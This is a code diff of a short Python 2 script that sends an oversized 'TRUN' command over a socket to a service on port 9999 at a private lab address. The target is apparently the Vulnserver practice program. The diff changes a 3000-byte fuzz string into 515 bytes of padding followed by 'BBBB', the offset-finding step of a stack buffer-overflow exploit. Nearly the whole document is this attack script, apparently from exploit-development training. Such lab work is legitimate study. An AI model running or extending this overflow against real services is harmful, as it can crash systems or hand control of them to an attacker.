@@ -1,15 +1,23 @@
-import sys, socket
+import socket
 
-buff = "TRUN /.:/"
+import sys
 
-buff += "A" * 3000
+buff ="TRUN /.:/"
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+buff += "A" * 515 + "BBBB"
 
-s.connect(('192.168.1.16',9000))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-print s.recv(1024)
+try:
+
+	s.connect(('192.168.1.16', 9999))
+
+except:
+
+	print "Error"
+
+	sys.exit(0)
+
+s.recv(1024)
 
 s.send(buff)
-
-s.close()
